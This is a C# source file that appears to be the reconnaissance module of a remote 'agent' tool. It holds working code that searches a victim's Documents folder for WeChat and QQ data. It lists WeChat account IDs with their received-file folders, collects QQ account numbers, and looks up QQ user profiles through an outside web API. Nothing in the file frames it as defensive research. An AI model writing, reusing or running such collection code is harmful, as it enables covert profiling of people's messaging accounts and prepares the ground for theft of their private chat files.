using System.Collections.Concurrent;
using System.Text.RegularExpressions;

namespace LibraNextgen.Agent.Modules.Recon;

public static class OtherSoftware
{
    private static readonly ConcurrentDictionary<string, string> _qqInfoCache = new();

    private static readonly HttpClient _qqHttp = new()
    {
        Timeout = TimeSpan.FromSeconds(10)
    };
    public static string CollectWeChat()
    {
        try
        {
            var docs = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
            var xwechatDir = Path.Combine(docs, "Tencent Files", "xwechat_files");
            if (!Directory.Exists(xwechatDir))
                return """{"accounts":[]}""";

            var accounts = new List<string>();
            foreach (var dir in Directory.GetDirectories(xwechatDir))
            {
                var name = Path.GetFileName(dir);
                if (!name.StartsWith("wxid_")) continue;

                var fileDir = Path.Combine(dir, "msg", "file");
                var monthDirs = new List<string>();
                if (Directory.Exists(fileDir))
                {
                    foreach (var sub in Directory.GetDirectories(fileDir))
                    {
                        var subName = Path.GetFileName(sub);
                        if (Regex.IsMatch(subName, @"^\d{4}-\d{2}$"))
                            monthDirs.Add(subName);
                    }
                    monthDirs.Sort();
                    monthDirs.Reverse(); // newest first
                }

                accounts.Add($$"""{"wxid":"{{Esc(name)}}","path":"{{Esc(dir)}}","fileDirs":[{{string.Join(",", monthDirs.Select(d => $"\"{Esc(d)}\""))}}]}""");
            }

            return $$"""{"accounts":[{{string.Join(",", accounts)}}]}""";
        }
        catch
        {
            return """{"accounts":[]}""";
        }
    }

    public static string CollectQQ()
    {
        try
        {
            var docs = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
            var tencentDir = Path.Combine(docs, "Tencent Files");
            if (!Directory.Exists(tencentDir))
                return """{"accounts":[]}""";

            var accounts = new List<string>();
            foreach (var dir in Directory.GetDirectories(tencentDir))
            {
                var name = Path.GetFileName(dir);
                if (name.Length >= 5 && name.All(char.IsDigit))
                {
                    accounts.Add($$"""{"number":"{{Esc(name)}}","path":"{{Esc(dir)}}"}""");
                }
            }

            return $$"""{"accounts":[{{string.Join(",", accounts)}}]}""";
        }
        catch
        {
            return """{"accounts":[]}""";
        }
    }

    public static async Task<string> CollectQQInfoAsync(string qq)
    {
        // Return cached result if available
        if (_qqInfoCache.TryGetValue(qq, out var cached))
            return cached;

        try
        {
            var url = $"https://uapis.cn/api/v1/social/qq/userinfo?qq={qq}";
            var json = await _qqHttp.GetStringAsync(url);

            // Cache the raw JSON
            _qqInfoCache[qq] = json;
            return json;
        }
        catch (Exception ex)
        {
            return $$"""{"error":"{{Esc(ex.Message)}}"}""";
        }
    }

    private static string Esc(string s) => s.Replace("\\", "\\\\").Replace("\"", "\\\"");
}
